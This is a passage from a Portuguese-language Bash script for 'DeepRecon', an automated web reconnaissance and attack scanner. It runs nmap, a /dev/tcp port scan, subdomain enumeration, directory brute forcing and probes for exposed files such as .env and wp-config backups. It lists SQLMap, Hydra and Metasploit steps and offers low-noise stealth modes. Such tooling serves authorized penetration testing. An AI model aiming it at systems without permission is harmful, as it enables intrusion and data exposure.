echo -e "${YELLOW}${BOLD}║${RESET}  1. ${BOLD}RESPONSABILIDADE:${RESET} O uso deste scanner"
echo -e "${YELLOW}${BOLD}║${RESET}     e de inteira responsabilidade do usuario."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  2. ${BOLD}NAO NOS RESPONSABILIZAMOS${RESET} por qualquer"
echo -e "${YELLOW}${BOLD}║${RESET}     dano, perda de dados, ou problemas legais"
echo -e "${YELLOW}${BOLD}║${RESET}     decorrentes do uso desta ferramenta."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  3. Use apenas em sistemas que ${BOLD}VOCE POSSUI${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}     ou tem ${BOLD}AUTORIZACAO EXPLICITA${RESET} por escrito."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  4. ${BOLD}PRIVACIDADE:${RESET} Nenhum dado e coletado"
echo -e "${YELLOW}${BOLD}║${RESET}     ou enviado. Tudo roda localmente na maquina."
echo -e "${YELLOW}${BOLD}║${RESET}"
echo -e "${YELLOW}${BOLD}║${RESET}  5. Ao continuar, voce aceita estes termos."
echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
if [ $# -eq 0 ]; then
  echo -e "${BOLD}Ao continuar, voce aceita os termos acima.${RESET}"
  echo -ne "${YELLOW}Digite ${GREEN}S${RESET}${YELLOW} para aceitar ou ${RED}N${RESET}${YELLOW} para sair: ${RESET}"
  read -r ACEITA
  if [[ "$ACEITA" != "S" && "$ACEITA" != "s" ]]; then
    echo -e "${RED}Termos nao aceitos. Saindo.${RESET}"
    exit 1
  fi
fi

# ============================================================
# SELECAO DE MODO: ALVO UNICO OU MULTIPLOS ALVOS
# ============================================================
ALVOS=()

if [ $# -ge 1 ]; then
  for url in "$@"; do
    echo "$url" | grep -qE '^https?://' || url="http://$url"
    ALVOS+=("$url")
  done
else
  echo ""
  echo -e "${BOLD}Selecione o modo de scan:${RESET}"
  echo -e "  ${GREEN}[1]${RESET} Alvo unico"
  echo -e "  ${GREEN}[2]${RESET} Multiplos alvos"
  echo -e "  ${GREEN}[3]${RESET} Arquivo de alvos (-f)"
  echo ""
  printf "${YELLOW}Escolha (1/2/3): ${RESET}"
  read -r MODO

  case $MODO in
    1)
      printf "${YELLOW}Digite a URL do alvo: ${RESET}"
      read -r URL
      echo "$URL" | grep -qE '^https?://' || URL="http://$URL"
      ALVOS+=("$URL")
      ;;
    2)
      printf "${YELLOW}Digite as URLs (separadas por espaco): ${RESET}"
      read -ra ALVOS_USER
      for url in "${ALVOS_USER[@]}"; do
        [ -n "$url" ] && {
          echo "$url" | grep -qE '^https?://' || url="http://$url"
          ALVOS+=("$url")
        }
      done
      ;;
    3)
      printf "${YELLOW}Caminho do arquivo: ${RESET}"
      read -r ARQUIVO
      if [ ! -f "$ARQUIVO" ]; then
        echo -e "${RED}Arquivo nao encontrado: $ARQUIVO${RESET}"
        exit 1
      fi
      while IFS= read -r url || [ -n "$url" ]; do
        url=$(echo "$url" | xargs)
        [ -n "$url" ] && [[ "$url" != \#* ]] && {
          echo "$url" | grep -qE '^https?://' || url="http://$url"
          ALVOS+=("$url")
        }
      done < "$ARQUIVO"
      ;;
    *)
      echo -e "${RED}Opcao invalida. Abortando.${RESET}"
      exit 1
      ;;
  esac
fi

if [ ${#ALVOS[@]} -eq 0 ]; then
  echo -e "${RED}Nenhuma URL informada. Abortando.${RESET}"
  exit 1
fi

# Carrega API keys de .env (se existir)
carregar_env

# ============================================================
# HARDWARE CHECK + LOADING
# ============================================================
clear
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║        DIAGNOSTICO DE HARDWARE                  ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  CPU: ${BOLD}${CPU_CORES} nucleos${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  RAM: ${BOLD}${TOTAL_RAM} MB${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Disco: ${BOLD}${FREE_DISK} MB livres${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Desempenho: ${HW_COR}${BOLD}${HW_NIVEL}${RESET} (threads: $THREADS)"
echo -e "${CYAN}${BOLD}║${RESET}"
if [ "$HW_NIVEL" = "BAIXO" ]; then
  echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}AVISO: Hardware basico. Scans mais lentos.${RESET}"
  echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}Feche outros programas para melhor desempenho.${RESET}"
fi
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
verificar_versoes
echo ""
loading_bar 3 "Preparando modulos"
echo ""

# Auto-update
verificar_atualizacao

# ============================================================
# MODO DE SCAN + RUÍDO
# ============================================================
NOISE_LEVELS=(2 0 2 1 3 7 5 4 7 6 5 5 6 4 7 2 0 0 2 3 1 7 6 0 1 1 2 2 1 2 3 1 0 0 5)
NOISE_TOTAL_MAX=0; for n in ${NOISE_LEVELS[*]}; do NOISE_TOTAL_MAX=$((NOISE_TOTAL_MAX+n)); done
MODO=""; NOISE_MAX=5; CUSTOM_RUIDO=0
clear
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║         SELECIONE O MODO DE SCAN                ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[1] FURTIVO${RESET}  - Apenas recon passivo"
echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}  Sem brute force ou exploits${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${GREEN}  Max noise 3/7${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[2] MEDIO${RESET}    - Scan moderado"
echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}  Sem password brute ou SQLi pesado${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}  Max noise 5/7${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[3] BRUTO${RESET}    - Scan completo"
echo -e "${CYAN}${BOLD}║${RESET}  ${RED}  Tudo: SQLMap, Hydra, WAF trigger${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${RED}  Max noise 7/7${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  ${BOLD}[4] CUSTOM${RESET}   - Escolha manual"
echo -e "${CYAN}${BOLD}║${RESET}  ${CYAN}  Voce seleciona cada passo${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
printf "${YELLOW}Escolha o modo (1-4): ${RESET}"; read -r MODO_ESCOLHA
case $MODO_ESCOLHA in
  1) MODO="furtivo"; NOISE_MAX=3; RATE_LIMIT_MS=1000 ;;
  2) MODO="medio"; NOISE_MAX=5; RATE_LIMIT_MS=300 ;;
  3) MODO="bruto"; NOISE_MAX=7; RATE_LIMIT_MS=100 ;;
  4) MODO="custom"; RATE_LIMIT_MS=200 ;;
  *) echo -e "${RED}Opcao invalida. Usando MEDIO.${RESET}"; MODO="medio"; NOISE_MAX=5; RATE_LIMIT_MS=300 ;;
esac

# Calcula threads das ferramentas baseado no rate limit
if [ "$RATE_LIMIT_MS" -ge 500 ]; then TOOL_THREADS=5
elif [ "$RATE_LIMIT_MS" -ge 200 ]; then TOOL_THREADS=15
else TOOL_THREADS=30
fi
TOOL_THREADS=$(( TOOL_THREADS < THREADS ? TOOL_THREADS : THREADS ))

# modo custom: selecao passo a passo
if [ "$MODO" = "custom" ]; then
  STEP_NAMES=("WAF detect" "Headers" "WhatWeb" "SSL/TLS" "Subdominios" "Nmap" "Diretorios" "Arquivos sensiveis" "SQLMap" "Commix" "FFUF" "WFuzz" "Nikto" "WPScan" "Hydra" "DNSRecon" "Whois" "SearchSploit" "HTTP Methods" "Servicos comuns" "CVE Check" "Exploracao agressiva" "Metasploit" "Joguin IA" "Site info" "Email Security" "robots.txt" "SSL Grade" "JWT Hunter" "Traceroute" "WAF Behavior" "Tech CVE" "JSON Export" "HTML Report" "Deep Ports + SMB")
  STEP_CHOICES=(); CUMULATIVE_NOISE=0
  for ((i=0;i<${#STEP_NAMES[@]};i++)); do
    rn=${NOISE_LEVELS[$i]}; rc=$([ "$rn" -le 2 ]&&echo "$GREEN"||[ "$rn" -le 5 ]&&echo "$YELLOW"||echo "$RED")
    clear
    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}${BOLD}║       MODO CUSTOM - Selecione os passos         ║${RESET}"
    echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
    np=$((CUMULATIVE_NOISE*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
    nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
    echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}[${nf}${ne}]${RESET}  ${np}% (${CUMULATIVE_NOISE}/${NOISE_TOTAL_MAX})"
    echo -e "${CYAN}${BOLD}║${RESET}"
    echo -e "${CYAN}${BOLD}║${RESET}  Passo $((i+1))/35: ${STEP_NAMES[$i]}"
    echo -e "${CYAN}${BOLD}║${RESET}  Ruido: ${rc}${rn}/7${RESET}"
    printf "${CYAN}${BOLD}║${RESET}  Rodar? ${GREEN}[S]${RESET}/${RED}n${RESET}: "; read -r resp
    if [[ "$resp" != "n" && "$resp" != "N" ]]; then
      STEP_CHOICES+=("1"); CUMULATIVE_NOISE=$((CUMULATIVE_NOISE+rn))
    else
      STEP_CHOICES+=("0")
    fi
  done
  clear
  echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
  echo -e "${CYAN}${BOLD}║      RESULTADO CUSTOM                           ║${RESET}"
  echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
  echo -e "${CYAN}${BOLD}║${RESET}  Ativos: ${GREEN}$(echo "${STEP_CHOICES[@]}"|tr -d ' '|grep -o '1'|wc -l)${RESET}"
  echo -e "${CYAN}${BOLD}║${RESET}  Ruido: ${YELLOW}$CUMULATIVE_NOISE/$NOISE_TOTAL_MAX${RESET}"
  np=$((CUMULATIVE_NOISE*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
  echo -e "${CYAN}${BOLD}║${RESET}  ${YELLOW}[${nf}${ne}]${RESET}  ${np}%"
  echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
  sleep 2; NOISE_MAX=7; CUSTOM_RUIDO=$CUMULATIVE_NOISE
fi

# configurar autenticacao
echo -ne "${YELLOW}Configurar autenticacao para o scan? (s/N): ${RESET}"; read -r auth_q
[[ "$auth_q" = "s" || "$auth_q" = "S" ]] && configurar_auth
login_automatico

# display noise bar
if [ "$MODO" = "custom" ] && [ "$CUSTOM_RUIDO" -gt 0 ] 2>/dev/null; then
  np=$((CUSTOM_RUIDO*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
  [ "$np" -le 30 ] && nc=$GREEN nl="BAIXO"; [ "$np" -gt 30 ] && [ "$np" -le 60 ] && nc=$YELLOW nl="MEDIO"
  [ "$np" -gt 60 ] && nc=$RED nl="ALTO"
  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
  nd="${CUSTOM_RUIDO}/${NOISE_TOTAL_MAX} (${np}%)"
else
  np=$((NOISE_MAX*100/7))
  [ "$NOISE_MAX" -le 3 ] && nc=$GREEN nl="BAIXO"; [ "$NOISE_MAX" -gt 3 ] && [ "$NOISE_MAX" -le 5 ] && nc=$YELLOW nl="MEDIO"
  [ "$NOISE_MAX" -gt 5 ] && nc=$RED nl="ALTO"
  nf=$(printf "%$((np/2))s"|tr ' ' '#'); ne=$(printf "%$((50-np/2))s")
  nd="Max noise: $NOISE_MAX/7"
fi

echo ""
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║           NIVEL DE BARULHO DO SCAN               ║${RESET}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${CYAN}${BOLD}║${RESET}  Modo: ${BOLD}$(echo "$MODO"|tr 'a-z' 'A-Z')${RESET}  |  Ruido: ${nc}${BOLD}${nl}${RESET}  |  $nd | Delay: ${RATE_LIMIT_MS}ms"
echo -e "${CYAN}${BOLD}║${RESET}  ${nc}[${nf}${ne}]${RESET}"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${CYAN}${BOLD}║              Alvos: ${#ALVOS[@]} site(s)                      ║${RESET}"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
for i in "${!ALVOS[@]}"; do
  echo -e "  ${BOLD}[$((i+1))]${RESET} ${ALVOS[$i]}"
# ============================================================

# ============================================================
echo ""
echo -e "${GREEN}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"

done
echo ""
sleep 3

# ============================================================
# LOOP PRINCIPAL - PARA CADA ALVO
# ============================================================
for ALVO in "${ALVOS[@]}"; do

DOMINIO=$(echo "$ALVO" | sed 's|https\?://||' | cut -d/ -f1 | cut -d: -f1)
PORTA=$(echo "$ALVO" | sed 's|https\?://||' | cut -d/ -f1 | grep -o ':[0-9]*$' | tr -d ':')
[ -z "$PORTA" ] && [ "$PROTOCOLO" = "https" ] && PORTA=443
[ -z "$PORTA" ] && PORTA=80
PROTOCOLO=$(echo "$ALVO" | grep -q 'https' && echo "https" || echo "http")
REPORT_DIR="$SCRIPT_DIR/reports/$(date +%Y%m%d)"
mkdir -p "$REPORT_DIR" 2>/dev/null || REPORT_DIR="/tmp"
REPORT="$REPORT_DIR/DeepRecon_${DOMINIO}_$(date +%Y%m%d_%H%M%S).txt"
> "$REPORT"

TOTAL_PASSOS=35
NOISE_ACUM=0
PASSO_ATUAL=0

# flags de tecnologia
TEC_WP=0 TEC_JOOMLA=0 TEC_DRUPAL=0 TEC_IIS=0 TEC_APACHE=0 TEC_NGINX=0
TEC_PHP=0 TEC_ASP=0 TEC_PYTHON=0 TEC_NODE=0 TEC_JAVA=0
TEC_LOGIN=0 TEC_PARAM=0 TEC_FORM=0 TEC_UPLOAD=0 TEC_NOME=""
WHATWEB_OUT=""

# instala ferramenta sob demanda (com seguranca e consentimento)
INSTALL_AUTO="${INSTALL_AUTO:-0}"
instalar_se_precisar() {
  local cmd="$1" pkg="${2:-$1}"
  command -v "$cmd" &>/dev/null && return 0
  echo -e "  ${YELLOW}[!] $cmd nao encontrado.${RESET}"
  echo -e "  ${YELLOW}AVISO: Instalacao altera pacotes do sistema via apt.${RESET}"
  echo -e "  ${YELLOW}Risco de conflito com dependencias existentes.${RESET}"
  if [ "$INSTALL_AUTO" != "1" ]; then
    echo -ne "  ${YELLOW}Instalar $pkg? (s/N/a=tudo): ${RESET}"; read -r inst_resp
    [[ "$inst_resp" = "a" || "$inst_resp" = "A" ]] && INSTALL_AUTO=1
    [[ "$inst_resp" != "s" && "$inst_resp" != "S" && "$INSTALL_AUTO" != "1" ]] && { aviso "$cmd nao instalado - pulando passo"; return 1; }
  fi
  echo -e "  ${YELLOW}Instalando $pkg (com --no-install-recommends)...${RESET}"
  sudo apt-get install -y --no-install-recommends -qq "$pkg" 2>/dev/null && command -v "$cmd" &>/dev/null && echo -e "  ${GREEN}[+] $cmd instalado${RESET}" && return 0
  pip3 install --user "$cmd" 2>/dev/null && command -v "$cmd" &>/dev/null && echo -e "  ${GREEN}[+] $cmd via pip3${RESET}" && return 0
  echo -e "  ${RED}[!!] Falha ao instalar $cmd${RESET}"; return 1
}

progresso() {
  local ruido="${2:-0}" nome="$1"
  if [ "$MODO" = "custom" ]; then
    local idx=$PASSO_ATUAL
    [ "$idx" -lt "${#STEP_CHOICES[@]}" ] && [ "${STEP_CHOICES[$idx]}" = "0" ] && { PASSO_ATUAL=$((PASSO_ATUAL+1)); return 1; }
  elif [ "$NOISE_MAX" -lt "$ruido" ]; then
    PASSO_ATUAL=$((PASSO_ATUAL+1))
    np=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
    echo -e "\n${YELLOW}[$((PASSO_ATUAL*100/TOTAL_PASSOS))%] [PULADO - $MODO] $nome${RESET}"
    echo -e "  ${YELLOW}Ruido: [$(printf "%$((np/2))s"|tr ' ' '#')$(printf "%$((50-np/2))s")] ${np}%${RESET}"
    return 1
  fi
  PASSO_ATUAL=$((PASSO_ATUAL+1))
  NOISE_ACUM=$((NOISE_ACUM+ruido))
  PERCENT=$((PASSO_ATUAL*100/TOTAL_PASSOS))
  np=$((NOISE_ACUM*100/(NOISE_TOTAL_MAX>0?NOISE_TOTAL_MAX:1)))
  nfill=$((np/2)); nempty=$((50-nfill))
  bf=$(printf "%${nfill}s"|tr ' ' '#'); be=$(printf "%${nempty}s")
  cn=$([ "$np" -le 30 ]&&echo "$GREEN"||[ "$np" -le 60 ]&&echo "$YELLOW"||echo "$RED")
  echo -e "\n${CYAN}[${PERCENT}%] $nome${RESET}"
  echo -e "  ${cn}Ruido: [${bf}${be}] ${np}%${RESET}"
}

info() {
  echo -e "  ${GREEN}[+] $1${RESET}"
}

aviso() {
  echo -e "  ${YELLOW}[!] $1${RESET}"
  echo -e "[ALERTA] $1" >> "$REPORT"
}

critico() {
  echo -e "  ${RED}[!!] $1${RESET}"
  echo -e "[CRITICO] $1" >> "$REPORT"
}

# ============================================================
echo ""
echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${MAGENTA}${BOLD}║        DEEPRECON v1.0 - Scanner Web              ║${RESET}"
echo -e "${MAGENTA}${BOLD}╠══════════════════════════════════════════════════╣${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Conexao:${RESET}    $(verificar_conexao "$ALVO" && echo "${GREEN}OK${RESET}" || echo "${RED}FALHOU${RESET}")"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Escopo:${RESET}      ${CYAN}*.$DOMINIO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Jobs:${RESET}        ${CYAN}$MAX_JOBS paralelos${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Disco livre:${RESET}  ${CYAN}${FREE_DISK}MB${RESET}"
if [ "$FREE_DISK" -lt 500 ]; then
  echo -e "${MAGENTA}${BOLD}║${RESET}  ${YELLOW}AVISO: Disco baixo! Limpe arquivos temporarios.${RESET}"
fi
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Alvo:${RESET}      ${CYAN}$ALVO${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}IP:${RESET}        ${CYAN}$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}')${RESET}"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Data:${RESET}      $(date '+%d/%m/%Y %H:%M:%S')"
echo -e "${MAGENTA}${BOLD}║${RESET}  ${BOLD}Relatorio:${RESET} ${CYAN}$REPORT${RESET}"
echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════╝${RESET}"
echo ""

# === VALIDACAO DE CONEXAO ===
if ! verificar_conexao "$ALVO"; then
  aviso "Alvo inalcancavel - continuando com info limitada"
fi
# === ESCOPO ===
SCOPE_DOMAIN="$DOMINIO"
SCOPE_ALVOS=()

# === DETECCAO DE NUVEM ===
HEADERS_INICIAIS=$(curl_rapido -I "$ALVO" 2>/dev/null)
IP_ALVO=$(host "$DOMINIO" 2>/dev/null | awk '/has address/{print $NF; exit}')
detectar_nuvem "$IP_ALVO" "$HEADERS_INICIAIS"

# === MODO SEGURO ===
detectar_forms_agressivos "$ALVO"

# ===== PASSO 1: WAF =====
progresso "WAFW00F - Detectando firewall" 2
if valida_ferramenta "wafw00f"; then
  wafw00f "$ALVO" 2>/dev/null | while read -r line; do
    if echo "$line" | grep -qi "behind"; then
      critico "WAF detectado: $(echo "$line" | cut -d: -f2-)"
    fi
  done || aviso "wafw00f falhou"
fi

# ===== PASSO 2: HEADERS =====
progresso "Analisando headers de seguranca" 2
HEADERS=$(curl_rapido -I -L "$ALVO" 2>/dev/null)
echo "$HEADERS" | head -25
echo ""
echo "$HEADERS" | grep -qi "strict-transport-security" || aviso "Falta HSTS"
echo "$HEADERS" | grep -qi "x-frame-options" || critico "Falta X-Frame-Options - Clickjacking!"
echo "$HEADERS" | grep -qi "x-content-type-options" || aviso "Falta X-Content-Type-Options"
echo "$HEADERS" | grep -qi "content-security-policy" || aviso "Falta CSP"
echo "$HEADERS" | grep -qi "x-xss-protection" || aviso "Falta X-XSS-Protection"
echo "$HEADERS" | grep -i "^set-cookie:" | grep -vi "secure" && aviso "Cookie sem flag Secure"

# ===== PASSO 3: WHATWEB =====
progresso "WhatWeb - Identificando tecnologias" 2
if valida_ferramenta "whatweb"; then
  WHATWEB_OUT=$(whatweb -a 3 "$ALVO" 2>/dev/null)
  echo "$WHATWEB_OUT"
  echo "$WHATWEB_OUT" | grep -qi "WordPress" && TEC_WP=1 && TEC_NOME="${TEC_NOME} WordPress"
  echo "$WHATWEB_OUT" | grep -qi "Joomla" && TEC_JOOMLA=1 && TEC_NOME="${TEC_NOME} Joomla"
  echo "$WHATWEB_OUT" | grep -qi "Drupal" && TEC_DRUPAL=1 && TEC_NOME="${TEC_NOME} Drupal"
  echo "$WHATWEB_OUT" | grep -qi "IIS" && TEC_IIS=1 && TEC_NOME="${TEC_NOME} IIS"
  echo "$WHATWEB_OUT" | grep -qi "Apache" && TEC_APACHE=1 && TEC_NOME="${TEC_NOME} Apache"
  echo "$WHATWEB_OUT" | grep -qi "nginx" && TEC_NGINX=1 && TEC_NOME="${TEC_NOME} Nginx"
  echo "$WHATWEB_OUT" | grep -qi "PHP" && TEC_PHP=1 && TEC_NOME="${TEC_NOME} PHP"
  echo "$WHATWEB_OUT" | grep -qi "ASP\.NET\|ASP" && TEC_ASP=1 && TEC_NOME="${TEC_NOME} ASP.NET"
  echo "$WHATWEB_OUT" | grep -qi "Django\|Python" && TEC_PYTHON=1 && TEC_NOME="${TEC_NOME} Python"
  echo "$WHATWEB_OUT" | grep -qi "Node\|Express" && TEC_NODE=1 && TEC_NOME="${TEC_NOME} Node.js"
  echo "$WHATWEB_OUT" | grep -qi "Java\|Tomcat\|JBoss" && TEC_JAVA=1 && TEC_NOME="${TEC_NOME} Java"
  echo "$WHATWEB_OUT" | grep -qi "login\|signin\|/admin\|/login\|/wp-login\|/user" && TEC_LOGIN=1
  echo "$WHATWEB_OUT" | grep -qiE "param|query|find|search|id=" && TEC_PARAM=1
  echo "$WHATWEB_OUT" | grep -qiE "form|input|submit|textarea" && TEC_FORM=1
  echo "$WHATWEB_OUT" | grep -qiE "upload|file|attach" && TEC_UPLOAD=1
  [ -n "$TEC_NOME" ] && info "Tecnologias detectadas: $TEC_NOME"
  detectar_spa
fi

# ===== PASSO 4: SSL =====
progresso "SSLScan - Verificando SSL/TLS" 2
if [ "$PROTOCOLO" = "https" ] && valida_ferramenta "sslscan"; then
  SSL_OUT=$(sslscan "$DOMINIO" 2>/dev/null) || aviso "sslscan falhou"
  echo "$SSL_OUT" | grep -iE "weak|error|heartbleed|poodle|rc4|cbc|tlsv1\.[01]" | head -15
  echo "$SSL_OUT" | grep -qi "heartbleed" && critico "VULNERAVEL A HEARTBLEED!"
  echo | openssl s_client -connect "${DOMINIO}:443" -servername "$DOMINIO" 2>/dev/null | openssl x509 -noout -subject -dates 2>/dev/null || true
fi

# ===== PASSO 5: SUBDOMINIOS =====
progresso "Subfinder - Descobrindo subdominios" 2
if valida_ferramenta "subfinder"; then
  while IFS= read -r sub; do
    escopo_adicionar "$sub" && info "  Subdominio: $sub"
  done < <(subfinder -d "$DOMINIO" -silent 2>/dev/null | head -30) || aviso "subfinder falhou"
fi
if valida_ferramenta "amass"; then
  while IFS= read -r sub; do
    escopo_adicionar "$sub" && info "  Subdominio amass: $sub"
  done < <(amass enum -d "$DOMINIO" -passive -timeout 30 2>/dev/null | head -30) || aviso "amass falhou"
fi

# ===== PASSO 6: ESCANEAR SUBDOMINIOS =====
if [ ${#SCOPE_ALVOS[@]} -gt 0 ]; then
  progresso "Escaneando subdominios descobertos" 1
  for sub_alvo in "${SCOPE_ALVOS[@]}"; do
    info "Scan rapido: $sub_alvo"
    if valida_ferramenta "nmap"; then
      nmap --top-ports 20 -T4 --open "$sub_alvo" 2>/dev/null | grep -E '^[0-9]' | head -5 || true
    fi
  done
fi

# ===== PASSO 6.5: GAU / WAYBACKURLS =====
progresso "Gau + Wayback - Endpoints historicos" 2
if [ "$WEB_ATIVO" = "1" ]; then
  if command -v gau &>/dev/null; then
    echo ""
    echo "=== GAU (GetAllUrls) - Wayback Machine + AlienVault ==="
    gau --subs "$DOMINIO" 2>/dev/null | head -50 || aviso "gau falhou"
  fi
  if command -v waybackurls &>/dev/null; then
    echo ""
    echo "=== waybackurls - Archive.org ==="
    waybackurls "$DOMINIO" 2>/dev/null | head -50 || aviso "waybackurls falhou"
  fi
fi

# ===== PASSO 7: NMAP =====
progresso "Nmap - Escaneando portas" 2
PORTAS_ABERTAS=(); SERVICOS_HTTP=(); WEB_ATIVO=0
if valida_ferramenta "nmap" && verificar_conexao "$ALVO"; then
  nmap_rate=$([ "$RATE_LIMIT_MS" -ge 500 ] && echo 50 || [ "$RATE_LIMIT_MS" -ge 200 ] && echo 200 || echo 500)
  NMAP_RAW=$(nmap --top-ports 100 -T4 --max-retries 1 --min-rate "$nmap_rate" --open -sV "$DOMINIO" 2>/dev/null) || aviso "nmap scan de portas falhou"
  echo "$NMAP_RAW" | grep -E '^[0-9]|PORT|SERVICE|VERSION' | head -30
  echo ""
  (nmap -sV --script=http-title,http-server-header,http-headers "$DOMINIO" 2>/dev/null || aviso "nmap scripts falhou") | grep -E 'title|Server|Header' | head -10
  while IFS= read -r line; do
    port=$(echo "$line" | cut -d/ -f1)
    service=$(echo "$line" | awk '{for(i=3;i<=NF;i++) printf "%s ", $i}')
    [ -n "$port" ] && PORTAS_ABERTAS+=("$port")
    [ -n "$service" ] && echo "$service" | grep -qiE "http|www|web|proxy|api|rest|soap|graphql|dashboard|admin" && { WEB_ATIVO=1; SERVICOS_HTTP+=("$port"); }
  done < <(echo "$NMAP_RAW" | grep -E "^[0-9]+/tcp" | grep -v "^|")
else
  info "Nmap nao disponivel - usando bash TCP scan basico"
  for port in 21 22 23 25 53 80 110 143 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 6379 8080 8443 9090 27017; do
    timeout 2 bash -c "echo > /dev/tcp/$DOMINIO/$port" 2>/dev/null && {
      PORTAS_ABERTAS+=("$port")
      echo -e "${GREEN}[ABERTA]${RESET} Porta $port" && critico "PORTA ABERTA: $DOMINIO:$port"
    }
  done
fi
# detecta servico web por nome OU por portas web comuns
for pweb in 80 443 8080 8443 3000 5000 8000 8888 9000 9090 9443; do
  [[ " ${PORTAS_ABERTAS[*]} " =~ " $pweb " ]] && WEB_ATIVO=1
done
[ "$WEB_ATIVO" = "1" ] && info "Servico web ativo (portas: ${SERVICOS_HTTP[*]:-${PORTAS_ABERTAS[*]}})" || aviso "Nenhum servico web detectado - ferramentas web serao puladas"

# ===== PASSO 8: GOBUSTER =====
progresso "Gobuster - Descobrindo diretorios" 2
if [ "$WEB_ATIVO" = "1" ] && valida_ferramenta "gobuster" && verificar_conexao "$ALVO"; then
  if [ "$MODO" = "furtivo" ]; then
    WORDLIST=$(mini_wordlist)
    info "Modo furtivo: wordlist mini (50 paths)"
  else
    WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    [ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/dirb/common.txt"
  fi
  if [ -f "$WORDLIST" ]; then
    (gobuster dir -u "$ALVO" -w "$WORDLIST" -t "$TOOL_THREADS" -q -s 200,301,302,403,401 -x php,txt,html,bak,zip,tar,sql,json,xml 2>/dev/null || aviso "gobuster falhou") | head -50
  fi
fi

# ===== PASSO 9: ARQUIVOS SENSIVEIS =====
progresso "Procurando arquivos sensiveis" 2
if [ "$WEB_ATIVO" = "1" ]; then
for path in admin login backup wp-admin config .git .env .htaccess .svn phpinfo.php test.php info.php debug.php console painel dashboard painel administrativo xmlrpc.php wp-config.php.bak wp-config.php~ dump.sql database.sql server-status server-info crossdomain.xml; do
  body_code=$(curl_rapido -L --max-time 3 -o /tmp/.deeprecon_body -w "%{http_code}" "$ALVO/$path" 2>/dev/null)
  body=$(cat /tmp/.deeprecon_body 2>/dev/null | head -c 500)
  if [ "$body_code" != "000" ]; then
    if [ "$body_code" = "200" ]; then
      case "$path" in
        admin|login|wp-admin|painel|dashboard|administrativo|console)
